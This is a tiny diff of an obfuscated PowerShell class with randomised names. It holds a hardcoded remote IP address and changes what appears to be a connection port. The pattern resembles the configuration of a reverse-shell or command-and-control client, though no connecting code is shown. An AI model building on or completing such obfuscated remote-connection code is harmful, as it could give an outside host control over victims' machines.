@@ -1,7 +1,7 @@
 class npSgwkrl {
     
     [string]$lTPkZLzfGYccfR = "193.161.193.99"
-    [int]$VUNPHwE = 46922
+    [int]$VUNPHwE = 54394
 
     $FGsrhtCeijO
     $qrikxidheUKFLtFzQGnirekZ
